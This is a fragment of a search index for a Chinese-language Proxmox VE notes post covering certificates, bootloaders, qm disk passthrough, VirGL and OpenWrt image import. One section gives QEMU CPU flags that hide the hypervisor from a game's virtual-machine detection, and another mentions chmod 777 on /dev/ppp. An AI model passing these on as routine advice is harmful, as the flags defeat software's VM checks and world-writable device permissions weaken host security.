\u7684\u60c5\u51b5\u4e0b\uff0c\u4f7f\u7528\u7684\u8bc1\u4e66\u4f4d\u4e8e<code>/etc/pve/nodes/NODENAME/pveproxy-ssl.pem</code></li> </ol> <pre><code>-rw-r----- 1 root www-data 3.2K Dec  2 14:46 pveproxy-ssl.key\n-rw-r----- 1 root www-data 5.8K Dec  2 14:46 pveproxy-ssl.pem\n-rw-r----- 1 root www-data 1.7K Sep 13 21:04 pve-ssl.key\n-rw-r----- 1 root www-data 1.8K Sep 13 21:04 pve-ssl.pem\n</code></pre> <p>\u8bc1\u4e66\u4f7f\u7528 pvenode \u547d\u4ee4\u7ba1\u7406</p>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#trusted-certificates-via-lets-encrypt-acme","title":"Trusted certificates via Let\u2019s Encrypt (ACME)","text":"<ul> <li> <p>\u9996\u5148\u9700\u8981\u6ce8\u518c\u4e00\u4e2a ACME \u8d26\u53f7\uff0c\u4ec5\u9700\u8981\u63d0\u4f9b\u90ae\u7bb1\u7528\u4e8e\u63a5\u6536\u901a\u77e5</p> <ul> <li>web \u754c\u9762\uff1aDatacenter -&gt; ACME</li> <li>\u547d\u4ee4\u884c</li> </ul> <pre><code>pvenode acme account register account-name mail@example.com\n</code></pre> </li> </ul> <ul> <li>\u7136\u540e\u6dfb\u52a0\u4e00\u4e2a ACME plugin\uff0c\u7528\u4e8e\u81ea\u52a8\u7533\u8bf7\u548c\u66f4\u65b0\u8bc1\u4e66\uff0c\u652f\u6301\u8bb8\u591a dns \u670d\u52a1\u5546<ul> <li>plugin ID\uff1a\u81ea\u5df1\u53d6\u4e00\u4e2a\u6807\u8bc6\u540d\u79f0\uff0c\u540e\u9762\u4e3a node \u7533\u8bf7\u8bc1\u4e66\u65f6\u9700\u8981\u6307\u5b9a</li> <li>DNS API\uff1a\u9009\u62e9\u81ea\u5df1\u7684 DNS \u670d\u52a1\u5546\uff08\u5982\u679c\u6ca1\u6709\u7684\u8bdd\uff0c\u5e76\u4e14\u6709\u5176\u5b83\u652f\u6301\u7684\u57df\u540d\u7684\u8bdd\uff0c\u53ef\u4ee5\u641c\u7d22 DNS Validation through CNAME Alias \u65b9\u6848\uff09</li> <li>\u540e\u9762\u7684\u6570\u636e\u5219\u6839\u636e API \u7684\u4e0d\u540c\u662f\u4e0d\u540c\u7684<ul> <li>cloudflare \u652f\u6301\u7c97\u7c92\u5ea6\u7684 Global API Key \u548c API Token \u4e24\u79cd\u9a8c\u8bc1\u65b9\u5f0f\uff1aUser API Tokens | Cloudflare </li> </ul> </li> </ul> </li> </ul> <ul> <li>\u7136\u540e\u5c31\u662f\u4e3a node \u6dfb\u52a0\u8bc1\u4e66<ul> <li>Node -&gt; Certificates\uff0cACME \u9009\u62e9 Add</li> <li>\u9009\u62e9 challenge type \u5e76\u586b\u5199\u8bc1\u4e66\u5bf9\u5e94\u7684\u57df\u540d</li> <li>\u7136\u540e\u9009\u62e9 Account \u7136\u540e Order Certificates Now \u5373\u53ef </li> </ul> </li> </ul>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#bootloader","title":"Bootloader","text":"<p>Host Bootloader - Proxmox VE</p> <p>pve \u4f1a\u521b\u5efa\u4e09\u4e2a\u5206\u533a</p> <ul> <li>1M BIOS \u5206\u533a</li> <li>512M EFI \u5206\u533a\uff08\u4e5f\u53eb ESP \u5206\u533a\uff0cEFI system partition (ESP)\uff0c\u901a\u5e38\u6302\u8f7d\u5728 /efi/, /boot, \u6216\u8005 /boot/efi\uff09</li> <li>\u5269\u4f59\u5927\u5c0f\u521b\u5efa pve \u7684 storage</li> </ul>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u652f\u6301\u7684\u4e24\u4e2a\u5f15\u5bfc\u7a0b\u5e8f","title":"\u652f\u6301\u7684\u4e24\u4e2a\u5f15\u5bfc\u7a0b\u5e8f","text":"<ul> <li>grub<ul> <li>linux \u4e8b\u5b9e\u6807\u51c6</li> <li>\u4e30\u5bcc\u7684\u6587\u6863</li> </ul> </li> <li>systemd-boot<ul> <li>\u7b80\u5355</li> <li>kernel \u548c initrd \u76f4\u63a5\u653e\u5728 ESP \u5206\u533a</li> <li>\u914d\u7f6e\u4e5f\u5168\u90e8\u653e\u5728 ESP \u5206\u533a /loader</li> </ul> </li> </ul> <p>PVE \u5bf9\u4e8e\u6ca1\u6709\u5b89\u5168\u542f\u52a8\u7684 zfs \u7c7b\u578b\u91c7\u7528 systemd-boot\uff0c\u5176\u4f59\u4f7f\u7528 grub\u3002</p> <p>\u67e5\u770b\u4f7f\u7528\u7684\u54ea\u4e2a\u5f15\u5bfc\u7a0b\u5e8f</p> <ul> <li>pve grub \u4e3a\u84dd\u8272\u754c\u9762\uff0c\u754c\u9762\u6bd4\u8f83\u590d\u6742\u3002systemd-boot \u4e3a\u9ed1\u767d\u754c\u9762\uff0c\u53ea\u6709\u7b80\u5355\u7684 entry \u9009\u62e9\u3002</li> <li><code>efibootmgr -v</code> \u53ef\u4ee5\u67e5\u770b\u6240\u6709 eif \u5f15\u5bfc\u9879\u4ee5\u53ca\u5f15\u5bfc\u987a\u5e8f\u3002<ul> <li><code>\\EFI\\UBUNTU\\GRUBX64.EFI</code> \u7684\u662f grub</li> <li><code>\\EFI\\SYSTEMD\\SYSTEMD-BOOTX64.EFI</code> \u7684\u662f systemd-boot</li> </ul> </li> </ul>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#grub-\u914d\u7f6e","title":"grub \u914d\u7f6e","text":"<p><code>/etc/default/grub</code></p> <p>\u901a\u8fc7 update-grub \u5c06\u914d\u7f6e\u540c\u6b65\u5230 <code>/boot/grub/grub.cfg</code>\uff0c\u8fd9\u4e5f\u662f grub \u8fd0\u884c\u65f6\u8bfb\u53d6\u7684\u914d\u7f6e\u3002</p> <p>\u4fee\u6539 kernel cmdline</p> <p>The kernel commandline needs to be placed in the variable\u00a0<code>GRUB_CMDLINE_LINUX_DEFAULT</code>\u00a0in the file\u00a0<code>/etc/default/grub</code>. Running\u00a0<code>update-grub</code>\u00a0appends its content to all\u00a0linux\u00a0entries in\u00a0<code>/boot/grub/grub.cfg</code>.</p>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#systemd-boot-\u914d\u7f6e","title":"systemd-boot \u914d\u7f6e","text":"<p>\u4f4d\u4e8e ESP \u5206\u533a\u7684 <code>loader/loader.conf</code>\uff0c\u5c06 ESP \u6302\u8f7d\u5230 <code>/boot/efi</code> \u540e\u5373 <code>/boot/efi/loader/loader.conf</code></p> <pre><code>.\n\u251c\u2500\u2500 EFI\n\u251c\u2500\u2500 loader\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 entries\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 proxmox-6.2.16-20-pve.conf\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 proxmox-6.5.13-1-pve.conf\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 entries.srel\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 loader.conf\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 random-seed\n</code></pre> <pre><code>root@ryzen-pve \u279c  efi cat loader/entries/proxmox-6.5.13-1-pve.conf\ntitle    Proxmox Virtual Environment\nversion  6.5.13-1-pve\noptions  root=ZFS=rpool/ROOT/pve-1 boot=zfs amd_iommu=on iommu=pt pcie_acs_override=multifunction\nlinux    /EFI/proxmox/6.5.13-1-pve/vmlinuz-6.5.13-1-pve\ninitrd   /EFI/proxmox/6.5.13-1-pve/initrd.img-6.5.13-1-pve\n</code></pre> <p>The kernel commandline needs to be placed as one line in\u00a0<code>/etc/kernel/cmdline</code>. To apply your changes, run\u00a0<code>proxmox-boot-tool refresh</code>, which sets it as the\u00a0option\u00a0line for all config files in\u00a0<code>loader/entries/proxmox-*.conf</code>.</p> <p><code>proxmox-boot-tool</code> \u7528\u4e8e\u521b\u5efa\u3001\u540c\u6b65 ESP \u914d\u7f6e</p> <p>proxmox-boot-tool\u00a0is a utility used to keep the contents of the EFI System Partitions properly configured and synchronized.</p> <p>\u53ef\u4ee5\u7ba1\u7406\u591a\u4e2a ESP \u5206\u533a</p> <pre><code>proxmox-boot-tool status  #view the currently configured ESPs and their state\n\nproxmox-boot-tool format /dev/sda2\n\nproxmox-boot-tool init /dev/sda2\nproxmox-boot-tool init /dev/sda2 grub\n</code></pre>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u5176\u5b83","title":"\u5176\u5b83","text":"","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#startupboot-scripts","title":"startup/boot scripts","text":"<p>Start-up/boot script | Proxmox Support Forum \u56e0\u4e3a\u975e\u7279\u6743 lxc openwrt \u9700\u8981\u4fee\u6539 /dev/ppp \u6743\u9650\uff08\u6211\u76f4\u63a5 chmod 777\uff09\uff0c\u56e0\u6b64\u9700\u8981\u7cfb\u7edf\u91cd\u542f\u540e\u4fdd\u6301\u3002</p>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u5f00\u673a\u952e","title":"\u5f00\u673a\u952e","text":"","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u865a\u62df\u673a","title":"\u865a\u62df\u673a","text":"","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u547d\u4ee4\u884c-qm","title":"\u547d\u4ee4\u884c qm","text":"<p>qm(1) (proxmox.com)</p> <p>\u4e0d\u5fc5\u586b\u6240\u6709\u53c2\u6570\uff0c\u521b\u5efa\u540e\u5728 web \u4e2d\u518d\u6dfb\u52a0</p> <pre><code>qm create 120 --cores 2 --cpu host --memory 1024 --name u22-test --scsihw virtio-scsi-single --scsi0 local-zfs:vm-120-disk-root \n</code></pre>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u76f4\u901a\u78c1\u76d8","title":"\u76f4\u901a\u78c1\u76d8","text":"<p>Passthrough Physical Disk to Virtual Machine (VM) - Proxmox VE</p> <p>\u8fd9\u91cc\u7684\u76f4\u901a\u4e0d\u662f pci \u8bbe\u5907\u76f4\u901a\uff08\u6bd4\u5982\u7f51\u5361\uff09\uff0chost \u4e2d\u4ecd\u7136\u80fd\u770b\u5230\u5bf9\u5e94\u7684\u78c1\u76d8\uff0c\u5e76\u4e14\u80fd\u591f\u6302\u8f7d\u3002\u5982\u679c\u5728 host \u4fee\u6539\u7684\u8bdd\uff0c\u53ef\u80fd\u5bfc\u81f4\u6570\u636e\u635f\u574f\u3002 pci \u76f4\u901a\u662f\u628a\u78c1\u76d8\u63a7\u5236\u5668\uff08\u5982 nvme \u63a7\u5236\u5668\uff09\u76f4\u901a\u7ed9 VM\uff0chost \u4e2d\u5bf9\u5e94\u78c1\u76d8\u9a71\u52a8\u7ed1\u5b9a\u5230 vifo-pci\uff0c\u56e0\u6b64 host \u770b\u4e0d\u5230\u8be5\u78c1\u76d8\u3002</p> <p>\u8fd9\u91cc\u7684\u76f4\u901a\u548c\u4f7f\u7528\u865a\u62df\u955c\u50cf\u57fa\u672c\u6ca1\u533a\u522b\uff0c\u90fd\u662f\u7ed9\u865a\u62df\u673a\u63d0\u4f9b\u4e86\u4e00\u4e2a\u5757\u8bbe\u5907\u3002host \u5c06\u865a\u62df\u673a\u7684\u5199\u5165\u7ffb\u8bd1\u5230 host \u4e2d\u6267\u884c\u3002</p> <ul> <li>Hot-Plug/Add physical device as new virtual SCSI disk</li> </ul> <pre><code>qm set 592 -scsi2 /dev/disk/by-id/ata-ST3000DM001-1CH166_Z1F41BLC\n</code></pre> <ul> <li>Hot-Unplug/Remove virtual disk</li> </ul> <pre><code>qm unlink 592 --idlist scsi2\n</code></pre>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u76f4\u901a\u5206\u533a","title":"\u76f4\u901a\u5206\u533a","text":"<p>\u53ea\u9700\u8981\u628a\u4e0a\u9762 by-id \u8def\u5f84\u6307\u5b9a\u5177\u4f53\u5206\u533a\u5373\u53ef</p> <p>Is it possible to passthrough a partition of a drive to a VM? and not the entire disk? | Proxmox Support Forum</p> <p>I think \"qm set\" disk passthrough should work with partitions too: https://pve.proxmox.com/wiki/Passthrough_Physical_Disk_to_Virtual_Machine_(VM) Then its just for example\u00a0<code>qm set 592 -scsi2 /dev/disk/by-id/ata-ST3000DM001-1CH166_Z1F41BLC-part3</code>\u00a0instead of\u00a0<code>qm set 592 -scsi2 /dev/disk/by-id/ata-ST3000DM001-1CH166_Z1F41BLC</code></p>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u663e\u793a\u8bbe\u5907","title":"\u663e\u793a\u8bbe\u5907","text":"","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u4ecb\u7ecd","title":"\u4ecb\u7ecd","text":"<p>VGA and other display devices in qemu | \ud83c\uddfa\ud83c\udde6 kraxel\u2019s news</p> <p>qxl</p> <ul> <li>\u652f\u6301 2d \u52a0\u901f\uff0c\u4f46\u662f\u8be5\u529f\u80fd\u73b0\u5728\u5df2\u7ecf\u53d8\u5f97\u4e0d\u518d\u6709\u7528\u4e86\u3002\u8f6f\u4ef6\u901a\u5e38\u4f7f\u7528 OpenGL \u6216 Vulkan\uff0c3d \u6e32\u67d3\u3002</li> </ul> <p>This device has support for 2D acceleration. This becomes more and more useless though as modern display devices don't have dedicated 2D acceleration support any more and use the 3D engine for everything. The same happens on the software side, modern desktops are rendering with opengl or vulkan instead of using 2D acceleration.</p> <p>virtio vga</p> <ul> <li>\u652f\u6301\u786c\u4ef6\u8f85\u7ec4\u7684 opengl \u52a0\u901f</li> <li>\u76ee\u524d\u53ea\u6709 linux \u4e0b\u6709\u9a71\u52a8\uff0c\u56e0\u6b64\u53ea\u5728 linux \u5de5\u4f5c</li> </ul> <p>This device has (optional) hardware-assisted opengl acceleration support. This can be enabled using the\u00a0<code>virgl=on</code>\u00a0property, which in turn needs opengl support enabled (<code>gl=on</code>) in the qemu display.</p>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#virgl","title":"virgl","text":"<p>(7) VirGL vs GPU passthrough vs VirtIO or QXL : VFIO (reddit.com)</p> <p>\u4e3a\u4e86\u663e\u793a 3D \u56fe\u5f62\uff0c\u6e38\u620f\u9700\u8981\u4e3a GPU \u6253\u5f00\u4e00\u4e2a\u201c\u4e0a\u4e0b\u6587\u201d\u3002\uff08\u65e0\u8bba\u662f Direct3D\uff0cOpenGL\uff0cVulkan \u7b49\uff09\u3002\u6253\u5f00\u6b64\u4e0a\u4e0b\u6587\u540e\uff0c\u4ed6\u4eec\u53ef\u4ee5\u5411 GPU \u53d1\u9001\u547d\u4ee4\u4ee5\u4e0a\u4f20\u7eb9\u7406\u3001\u8fd0\u884c\u7740\u8272\u5668\u3001\u6e32\u67d3\u5185\u5bb9\u7b49\u3002 VirGL \u5141\u8bb8\u8bbf\u5ba2\u5728\u4e3b\u673a\u7684 GPU \u4e0a\u6253\u5f00\u8fd9\u4e9b\u4e0a\u4e0b\u6587\u3002\u4e3a\u6b64\uff0c\u5b83\u9700\u8981\u5728 VM \u4e2d\u62e5\u6709\u81ea\u5df1\u7684\u7279\u6b8a\u9a71\u52a8\u7a0b\u5e8f\uff0c\u8fd9\u4e9b\u9a71\u52a8\u7a0b\u5e8f\u72ec\u7acb\u4e8e\u5e95\u5c42 GPU \u7c7b\u578b\u3002 \u672a\u6765\u5f88\u53ef\u80fd\u662f\u00a0GPU-P (or GPU partitioning).\u3002\u6b64\u529f\u80fd\u5141\u8bb8\u7269\u7406 GPU \u63d0\u4f9b\u591a\u4e2a\u865a\u62df\u5206\u533a\uff0c\u5141\u8bb8\u4e3b\u673a\u548c\u6765\u5bbe\u4f7f\u7528\u76f8\u540c\u7684\u7269\u7406 GPU\u3002\u6709\u51e0\u79cd\u65b9\u6cd5\u53ef\u4ee5\u505a\u5230\u8fd9\u4e00\u70b9\uff0c\u4f46\u76ee\u524d\u5b83\u4e0d\u53d7\u5b98\u65b9\u652f\u6301\uff08\u5728\u6d88\u8d39\u8005\u5361\u4e2d\uff09\u3002</p> <p>\u9002\u5408\u8f7b\u91cf\u7684 3d \u52a0\u901f\uff08\u684c\u9762 compositor\uff09</p> <p>if you need 3D accel (eg even for desktop compositor effects, no heavy gaming) this is what you want. Otherwise you go with Intel GVT-g or full GPU passthrough.</p> <p>\u76ee\u524d\u8fd8\u4e0d\u652f\u6301 HW Video \u7f16\u89e3\u7801\u52a0\u901f</p> <p>One feature I would like is being able to use HW video decode too, but presently that requires passing in full GPU or vGPU.</p> <p>\u8bbe\u7f6e\u540e\uff0c\u5728 win10 \u4e2d\u6837\u5b50 </p> <p></p> <p>\u53ef\u4ee5\u73a9\u7b80\u5355 OpenGL \u6e38\u620f\uff1a\u6d4b\u8bd5\u4e86\u4e1c\u65b9 \u4e0d\u80fd\u73a9 yuzu \u6a21\u62df\u5668\uff0c\u9009\u62e9 OpenGL \u65f6\uff0c\u53ef\u4ee5\u9009\u62e9 GLSL\uff0c\u4f46\u662f\u4e0d\u80fd\u8fd0\u884c\u6e38\u620f\u3002\u9009 vulkan \u6ca1\u6709\u8bbe\u5907\u3002</p>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u9690\u85cf-kvm","title":"\u9690\u85cf KVM","text":"<p>\u8457\u540d\u4e8c\u5b57\u6e38\u620f\u65e0\u6cd5\u5728\u865a\u62df\u673a\u4e2d\u8fd0\u884c </p> <p>https://forum.proxmox.com/threads/hide-vm-from-guest.34905/post-176978</p> <pre><code>args: -cpu 'host,-hypervisor,+kvm_pv_unhalt,+kvm_pv_eoi,hv_spinlocks=0x1fff,hv_vapic,hv_time,hv_reset,hv_vpindex,hv_runtime,hv_relaxed,kvm=off,hv_vendor_id=intel'\n</code></pre> <p>Guest operating systems can test bit 31 of ECX of CPUID leaf 0x1, so\u00a0-hypervisor\u00a0flag prevent this. I can't add links\u00a0. You can read more about virtual machine detection mechanism in vmware knowledge base. Article is called \"Mechanisms to determine if software is running in a VMware virtual machin e\"</p> <p>\u66f4\u65b0\u4e00\u70b9\u7684 2022 Can't hide 'VM' status in Windows guest | Proxmox Support Forum</p> <p>In VM config: args: -cpu host,hv_vapic,hv_stimer,+invtsc,[more-flags],-hypervisor</p> <p>\u7ecf\u5c1d\u8bd5\u4e0a\u9762\u7684\u547d\u4ee4\u542f\u52a8\u65f6\u4f1a\u62a5\u9519\uff0c\u9700\u8981\u6dfb\u52a0\u66f4\u591a flag</p> <pre><code>root@ryzen-pve \u279c  ~ qm start 200\nkvm: Hyper-V synthetic timers (hv-stimer) requires Hyper-V clocksources (hv-time)\nstart failed: QEMU exited with code 1\nroot@ryzen-pve \u279c  ~ vim /etc/pve/qemu-server/200.conf\nroot@ryzen-pve \u279c  ~ qm start 200\nkvm: Hyper-V synthetic timers (hv-stimer) requires Hyper-V synthetic interrupt controller (hv-synic)\nstart failed: QEMU exited with code 1\nroot@ryzen-pve \u279c  ~ vim /etc/pve/qemu-server/200.conf\nroot@ryzen-pve \u279c  ~ qm start 200\nkvm: Hyper-V synthetic interrupt controller (hv-synic) requires Hyper-V VP_INDEX MSR (hv-vpindex)\nstart failed: QEMU exited with code 1\n</code></pre> <p>\u6700\u540e\u9700\u8981\u8865\u5145\u5b8c\u6574\u5230</p> <pre><code>args: -cpu host,hv_vapic,hv_stimer,hv_time,hv_synic,hv_vpindex,+invtsc,-hypervisor\n</code></pre> <p>\u6ce8\u610f\uff0c\u4e0d\u8981\u518d\u52a0 cpu: x86-64-v3 \u8fd9\u6837\u7684\u53c2\u6570\u4e86\u3002\u6211\u521a\u5f00\u59cb\u52a0\u4e86\uff0c\u5bfc\u81f4\u8fdb\u5165 vm\uff0cN \u5361\u9a71\u52a8\u62a5 43 \u9519\u8bef</p> <p>\u5176\u5b83</p> <ul> <li>virt-manger \u4e2d\u7c7b\u4f3c\u65b9\u6cd5\uff1a\u6c42\u52a9\uff01win11 wm \u6253\u5f00\u539f\u795e \u663e\u793a\u865a\u62df\u673a\u4e0b\u65e0\u6cd5\u8fd0\u884c - Chinese / \u7b80\u4f53\u4e2d\u6587 - Unraid</li> <li>Proxmox VE(PVE) \u865a\u62df\u673a\u7ed5\u8fc7\u8f6f\u4ef6\u7684\u865a\u62df\u673a\u68c0\u67e5\u6765\u73a9\u539f\u795e - \u67d0\u54b8\u9c7c\u7684\u7b14\u8bb0 (wunote.cn)</li> </ul>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u521b\u5efa-openwrt-\u5b9e\u4f8b","title":"\u521b\u5efa openwrt \u5b9e\u4f8b","text":"<p>\u56e0\u4e3a openwrt \u7684\u4f7f\u7528\u573a\u666f\u548c\u666e\u901a linux \u53d1\u884c\u7248\u4e0d\u540c\u3002\u5e76\u6ca1\u6709\u63d0\u4f9b\u5305\u542b installer \u7684 iso \u955c\u50cf\u3002\u800c\u662f\u76f4\u63a5\u63d0\u4f9b\u4e86\u4e00\u4e2a\u5206\u597d\u533a\u7684\u78c1\u76d8\u955c\u50cf\uff08\u7c7b\u4f3c\u4e8e dd if=/dev/sda of=openwrt.img\uff09\u3002\u56e0\u6b64\u5b89\u88c5 openwrt \u7684\u8fc7\u7a0b\u5c31\u662f\u76f4\u63a5\u628a\u78c1\u76d8\u955c\u50cf dd \u5230\u6574\u4e2a\u78c1\u76d8\u4e2d\u3002</p> <p>openwrt x86 \u63d0\u4f9b\u4e86 UEFI \u548c BIOS \u4e24\u79cd\u542f\u52a8\u7c7b\u578b\uff0c\u548c ext4 \u548c squarshfs \u4e24\u79cd\u6587\u4ef6\u7cfb\u7edf\uff0c\u7ec4\u5408\u4e0b\u6765 4 \u79cd\u7684\u78c1\u76d8\u955c\u50cf\u3002\u8fd9\u91cc\u8bf7\u53c2\u8003\u6587\u6863[OpenWrt Wiki] OpenWrt on x86 hardware (PC / VM / server)\u6216\u8005</p> <p>\u4e0b\u8f7d\u955c\u50cf</p> <ul> <li>combined-efi \u65e2\u652f\u6301 uefi \u542f\u52a8\uff0c\u4e5f\u652f\u6301 BIOS \u542f\u52a8\u3002</li> </ul>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#import-existing-disk-image","title":"import existing disk image","text":"<p>\u521b\u5efa\u865a\u62df\u673a\uff0c\u9700\u8981\u5c06 image \u955c\u50cf\u76f4\u63a5\u4f5c\u4e3a\u4e00\u4e2a\u78c1\u76d8\u6dfb\u52a0\u5230 vm \u4e2d\u3002\u4f46\u662f pve web \u754c\u9762\u6ca1\u6709\u8fd9\u4e2a\u529f\u80fd57 \u2013 KVM: enhance GUI import of disk images (proxmox.com)\uff0c\u53ea\u6709\u6dfb\u52a0 ISO \u955c\u50cf\uff0c\u4ee5\u53ca\u521b\u5efa\u65b0\u7684\u6307\u5b9a\u5927\u5c0f\u7684\u7a7a\u7684\u78c1\u76d8\u7684\u529f\u80fd\u3002\u56e0\u6b64\u9700\u8981\u4f7f\u7528\u547d\u4ee4\u884c\u3002 google: pve vm add existing disk image Add import existing disk image into Proxmox (github.com)</p> <p>\u5148\u7528 disk import \u5c06\u955c\u50cf\u4f5c\u4e3a\u865a\u62df\u78c1\u76d8\u6dfb\u52a0\u5230\u865a\u62df\u673a\uff0c\u4f46\u662f\u8fd9\u4e2a\u547d\u4ee4\u4e0d\u652f\u6301\u4fee\u6539\u78c1\u76d8\u5927\u5c0f\u3002\u9700\u8981\u989d\u5916\u4e00\u6761\u547d\u4ee4 <code>qm disk resize</code></p> <ul> <li><code>&lt;storage&gt;</code> \u4e3a\u865a\u62df\u78c1\u76d8\u7684\u5b58\u50a8\u6c60\u3002\u9ed8\u8ba4\u7684 lvm \u5b89\u88c5\uff0c\u7528\u4e8e\u5b58\u50a8\u78c1\u76d8\u955c\u50cf\u7684\u4e3a local-lvm\u3002\uff08local \u7528\u4e8e\u5b58\u50a8 iso \u7b49\uff09</li> <li>import \u540e\uff0cdisk \u9ed8\u8ba4\u662f unused\uff0c\u9700\u8981\u7f16\u8f91\u914d\u7f6e\u6587\u4ef6 /etc/pve/qemu-server/500.conf\uff0c\u5c06\u78c1\u76d8\u5206\u914d\u5230 scsi0 \u7b49\u63a7\u5236\u5668\u4e0a\u3002\u4e5f\u53ef\u4ee5\u5728 web \u4e2d edit unused \u78c1\u76d8\uff0c\u9009\u62e9\u5373\u53ef\u3002\u8fd8\u53ef\u4ee5\u547d\u4ee4\u884c <code>qm set --scsi</code></li> <li>\u9ed8\u8ba4\u78c1\u76d8\u5927\u5c0f\u662f\u955c\u50cf\u6587\u4ef6\u5927\u5c0f\uff0c\u4e4b\u540e\u6269\u5bb9\u6bd4\u8f83\u9ebb\u70e6\uff0c\u53ef\u4ee5\u4f7f\u7528 resize \u4fee\u6539\u3002resize \u662f\u7acb\u5373\u751f\u6548\u7684\uff0c\u4e0d\u7528\u91cd\u542f vm\u3002\uff08web \u754c\u9762 resize \u662f\u9700\u8981\u91cd\u542f\u7684\uff09</li> </ul> <pre><code>qm disk import &lt;vmid&gt; &lt;source&gt; &lt;storage&gt; [OPTIONS]\n# qm disk import 500 openwrt-23.05.3-x86-64-generic-squashfs-combined-efi.img local-lvm\n# pvesm list local-lvm \u4e2d\u53ef\u4ee5\u770b\u5230\u65b0\u5efa\u7684\u78c1\u76d8\u955c\u50cf\n\nqm set 500 --scsi0 local-zfs:vm-500-disk-0\n\nqm disk resize &lt;vmid&gt; &lt;disk&gt; &lt;size&gt; [OPTIONS]\n# qm disk resize 500 scsi0 16G\n</code></pre>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#uefi-\u65e0\u6cd5\u542f\u52a8","title":"uefi \u65e0\u6cd5\u542f\u52a8","text":"<p>efi shell \u4e2d\u53ef\u4ee5\u770b\u5230 EFI/boot/grubx64.efi\u3002\u4f46\u662f\u542f\u52a8\u65f6 Access denied</p> <p>\u517c\u5bb9 BIOS \u542f\u52a8</p> <ul> <li>/boot \u4e0b\u6ca1\u6709 efi \u76ee\u5f55 </li> </ul> <p>PVE uefi \u56fe\u5f62\u754c\u9762\u624b\u52a8\u6dfb\u52a0 boot entry OVMF/UEFI Boot Entries - Proxmox VE</p> <p>\u4e5f\u6709 efi shell \u547d\u4ee4\u884c\u6dfb\u52a0\u7684\u65b9\u5f0fUpdate EFI boot entries with UEFI shell (stigok.com)</p> <ul> <li>ESC \u5148\u8fdb\u5165 bios\uff0c\u518d\u9009\u62e9\u8fdb\u5165 efi shell</li> </ul> <pre><code>bcfg boot dump -v -b  # List all boot entries (`-v`\u00a0verbose,\u00a0`-b`\u00a0paged)\n\nFS1:\\&gt; bcfg boot add 0 fs1:\\EFI\\grub\\grubx64.efi grub\nTarget = 0000\nbcfg: Add Boot0000 as 0\n\nFS1:\\&gt; reset # reset to reboot\n</code></pre> <p>\u53c2\u8003\u8d44\u6599</p> <ul> <li>efi \u91cd\u8981\u547d\u4ee4\uff1aUnified Extensible Firmware Interface - ArchWiki (archlinux.org)</li> <li>efi intel \u624b\u518c\uff1aUEFI Shell | Intel\u00ae Software (archive.org)</li> </ul>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#lxc-\u5bb9\u5668","title":"LXC \u5bb9\u5668","text":"<p>https://pve.proxmox.com/wiki/Linux_Container</p>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u5bb9\u5668\u955c\u50cf","title":"\u5bb9\u5668\u955c\u50cf","text":"<pre><code> pveam update\n pveam available\npveam available --section system\n\npveam download local debian-10.0-standard_10.0-1_amd64.tar.gz\n</code></pre> <p>\u5bfc\u5165\u5bb9\u5668\u955c\u50cf 